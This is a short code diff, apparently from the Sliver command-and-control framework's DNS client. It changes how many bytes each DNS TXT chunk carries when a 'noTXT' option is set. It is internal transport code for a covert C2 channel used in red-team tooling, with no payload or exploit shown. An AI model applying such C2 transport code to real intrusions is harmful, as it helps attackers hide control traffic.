@@ -565,7 +565,12 @@ func (s *SliverDNSClient) parallelRecv(manifest *dnspb.DNSMessage) ([]byte, erro
 		return nil, ErrInvalidResponse
 	}
 
-	const bytesPerTxt = 182 // 189 with base64, -6 metadata, -1 margin
+	var bytesPerTxt uint32
+	if s.noTXT {
+		bytesPerTxt = 80
+	} else {
+		bytesPerTxt = 182 // 189 with base64, -6 metadata, -1 margin
+	}
 
 	wg := &sync.WaitGroup{}
 	results := make(chan *DNSResult, int(manifest.Size/bytesPerTxt)+1)
